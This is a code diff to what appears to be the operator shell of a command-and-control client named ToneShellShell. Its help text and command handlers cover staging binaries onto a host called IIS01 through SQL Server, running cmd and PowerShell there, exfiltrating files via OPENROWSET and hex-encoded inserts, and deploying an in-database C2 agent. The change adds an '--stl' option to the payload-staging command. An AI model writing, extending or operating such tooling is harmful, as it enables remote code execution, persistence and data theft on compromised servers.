@@ -19,7 +19,7 @@ Built-in commands (case-insensitive):
     xpshell cmd <cmd>               [DEPRECATED] run cmd via .bat staging on IIS01; use xpexec instead
     xpshell psh <ps_script>         [DEPRECATED] stage .ps1 and run PowerShell on IIS01; use xpexec powershell -Command instead
     xpstage-aes <payload> [--no-encrypt]   [DEPRECATED] stage binary via AES-256-CBC base64 + PowerShell on IIS01; use xpstage-hex instead
-    xpstage-hex <payload>                  stage binary via hex SQL + T-SQL ADODB.Stream (no .ps1)
+    xpstage-hex <payload> [--stl [--rename]]  stage binary via hex SQL + T-SQL ADODB.Stream (no .ps1)
     xpexfil-aes <remote_path> <local_name> [insert_timeout_s] [chunk_mb]  [DEPRECATED] exfil via AES-256-CBC + PowerShell on IIS01; use xpexfil-hex instead
     xpexfil-hex <remote_path> <local_name> [timeout] [chunk_mb]    hex exfil via OPENROWSET(BULK) + T-SQL INSERT; C2 Python decode
     xpagent init                    deploy xpagent in-DB C2 on IIS01 (runs xpagent_init.sql via SB)
@@ -200,11 +200,13 @@ class ToneShellShell(C2Client):
                     if not self.session:
                         print("[!] not attached to a session")
                     elif len(parts) < 2:
-                        print("usage: xpstage-hex <payload_name> [--rename]")
+                        print("usage: xpstage-hex <payload_name> [--stl [--rename]]")
                     elif not self._xp.ready():
                         print("[!] run xpinit first")
                     else:
-                        self._xp.cmd_xpstage_hex(self, parts[1], rename="--rename" in parts[2:])
+                        self._xp.cmd_xpstage_hex(self, parts[1],
+                            stl="--stl" in parts[2:],
+                            rename="--rename" in parts[2:])
 
                 elif cmd == "xpexfil-aes":
                     xp_parts = line.split()
